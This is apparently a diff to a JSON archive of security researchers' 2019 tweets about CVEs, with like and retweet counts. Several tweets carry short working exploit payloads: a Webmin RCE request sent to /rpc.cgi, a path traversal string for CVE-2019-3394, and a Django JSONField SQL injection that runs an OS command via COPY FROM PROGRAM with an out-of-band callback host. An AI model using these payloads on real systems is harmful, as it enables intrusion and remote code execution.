@@ -1,5 +1,28 @@
 {
     "expanded_url": [
+        "https://twitter.com/yigeban/status/1167323740440424450"
+    ],
+    "tweetfavorites": 129,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 61,
+    "tweettext": "CVE-2019-3394 :  src=\\\"/packages/../web.xml\\\" \n\nfull details analysis: @yigeban  https://t.co/8NdIPTD4Nv https://t.co/duOVOIx7Bn",
+    "tweettime": "2019-08-31, 02:30:45",
+    "tweeturl": "https://twitter.com/chybeta/status/1167625745738301440",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 724,
+    "tweetquotes": 10,
+    "tweetreplies": 11,
+    "tweetretweets": 363,
+    "tweettext": "CVE-2019-15642 another Webmin Remote Code Execution (authenticated)  \n\n1. set User-Agent as webmin  \n2. set Authorization \n3. set payload:\nOBJECT CGI;print \"Content-Type: chybeta\\n\\n\";$cmd=`id`;print \"$cmd\";\n4. post to /rpc.cgi https://t.co/boPYXpLpEv",
+    "tweettime": "2019-08-31, 01:58:16",
+    "tweeturl": "https://twitter.com/chybeta/status/1167617571287289856",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
         "https://blog.zecops.com/vulnerabilities/analysis-and-reproduction-of-cve-2019-7286/",
         "https://blog.zecops.com/vulnerabilities/exploit-of-cve-2019-7286/"
     ],
@@ -42,10 +65,10 @@
     "expanded_url": [
         "https://chybeta.github.io/2019/08/19/%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change/"
     ],
-    "tweetfavorites": 81,
+    "tweetfavorites": 80,
     "tweetquotes": 1,
     "tweetreplies": 0,
-    "tweetretweets": 24,
+    "tweetretweets": 23,
     "tweettext": "fully detailed analysis  for 【CVE-2019-15107】:RCE in Webmin &lt;= 1.920 via password-change\n\nthere is no need to add  a  vertical bar (|)  , we just set our parameter `old` value as `ifconfig`\n\nhttps://t.co/4QA5mCqQRC https://t.co/OPpX8Oxxj8",
     "tweettime": "2019-08-19, 14:00:03",
     "tweeturl": "https://twitter.com/chybeta/status/1163450556674797568",
@@ -136,4 +159,17 @@
     "tweettime": "2019-08-08, 14:17:57",
     "tweeturl": "https://twitter.com/linhlhq/status/1159468796479823873",
     "username": "linhlhq"
+}
+{
+    "expanded_url": [
+        "http://xxx.ceye.io"
+    ],
+    "tweetfavorites": 305,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 158,
+    "tweettext": "EXP for CVE-2019-14234 Django JSONField SQL Injection  \nStep1:\n\n?data__breed'%3f'a') OR 1%3d2 %3bCREATE table cmd_exec(cmd_output text) -- OR  ....\n\nStep2:\n?data__breed'%3f'a') OR 1%3d2 %3bCOPY cmd_exec FROM PROGRAM 'ping https://t.co/QSKdevS9Dt' -- OR  ... https://t.co/YMWa7GNUl2",
+    "tweettime": "2019-08-08, 00:33:56",
+    "tweeturl": "https://twitter.com/chybeta/status/1159261425279234048",
+    "username": "chybeta"
 }
